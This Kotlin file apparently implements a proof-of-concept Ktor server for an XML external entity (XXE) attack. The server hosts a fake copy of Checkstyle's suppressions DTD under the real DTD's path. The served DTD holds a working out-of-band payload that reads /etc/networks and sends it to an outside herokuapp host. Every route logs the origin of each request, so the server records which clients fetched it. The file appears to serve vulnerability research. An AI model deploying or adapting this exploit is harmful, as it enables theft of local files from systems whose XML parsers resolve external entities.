/*
 * This Kotlin source file was generated by the Gradle 'init' task.
 */
package org.jlleitschuh.testing.server

import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.parameters.options.default
import com.github.ajalt.clikt.parameters.options.option
import com.github.ajalt.clikt.parameters.types.int
import io.ktor.application.call
import io.ktor.application.install
import io.ktor.application.log
import io.ktor.features.CallLogging
import io.ktor.features.Compression
import io.ktor.features.DefaultHeaders
import io.ktor.features.origin
import io.ktor.http.ContentType
import io.ktor.http.HttpMethod
import io.ktor.http.HttpStatusCode
import io.ktor.http.RequestConnectionPoint
import io.ktor.http.content.TextContent
import io.ktor.response.respond
import io.ktor.routing.get
import io.ktor.routing.routing
import io.ktor.server.engine.embeddedServer
import io.ktor.server.netty.Netty
import org.slf4j.event.Level

class App {
    val greeting: String
        get() {
            return "Hello world."
        }
}

data class OriginInfo(
    override val host: String,
    override val method: HttpMethod,
    override val port: Int,
    override val remoteHost: String,
    override val scheme: String,
    override val uri: String,
    override val version: String
) : RequestConnectionPoint {

    constructor(requestConnectionPoint: RequestConnectionPoint) :
        this(
            host = requestConnectionPoint.host,
            method = requestConnectionPoint.method,
            port = requestConnectionPoint.port,
            remoteHost = requestConnectionPoint.remoteHost,
            scheme = requestConnectionPoint.scheme,
            uri = requestConnectionPoint.uri,
            version = requestConnectionPoint.version
        )
}

val dtd = """
<!-- Add the following to any file that is to be validated against this DTD:

<!DOCTYPE suppressions PUBLIC
    "-//Checkstyle//DTD SuppressionFilter Configuration 1.2//EN"
    "https://checkstyle.org/dtds/suppressions_1_2.dtd">
-->

<!ELEMENT suppressions (suppress*)>

<!ELEMENT suppress EMPTY>
<!ATTLIST suppress files CDATA #IMPLIED
                   checks CDATA #IMPLIED
                   message CDATA #IMPLIED
                   id CDATA #IMPLIED
                   lines CDATA #IMPLIED
                   columns CDATA #IMPLIED>

<!ENTITY % payload SYSTEM "file:///etc/networks">
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://testing-kotlin-server.herokuapp.com/x=%payload;">'>
%param1;
%external;
""".trimIndent()

private fun run(port: Int) {
    println("Launching on port `$port`")
    val server = embeddedServer(Netty, port) {
        install(DefaultHeaders)
        install(Compression)
        install(CallLogging) {
            level = Level.INFO
        }
        routing {
            get("/*") {
                log.info("Origin: ${OriginInfo(call.request.origin)}")
                call.respond(HttpStatusCode.OK)
            }
            get("") {
                log.info("Origin: ${OriginInfo(call.request.origin)}")
                call.respond(HttpStatusCode.OK)
            }
            get("/dtds/suppressions_1_2.dtd") {
                log.info("Retrieving DTD")
                log.info("Origin: ${OriginInfo(call.request.origin)}")
                call.respond(HttpStatusCode.OK, TextContent(
                    dtd,
                    contentType = ContentType.Application.Xml_Dtd
                ))
            }
        }
    }
    server.start()
}

/**
 * Launches the application and handles the args passed to [main].
 */
class Launcher : CliktCommand(
    name = "ktor-testing"
) {
    companion object {
        private const val defaultPort = 8080
    }

    private val port: Int by option(
        "-p",
        "--port",
        help = "The port that this server should be started on. Defaults to $defaultPort."
    )
        .int()
        .default(defaultPort)

    override fun run() {
        run(port)
    }
}

fun main(args: Array<String>) = Launcher().main(args)
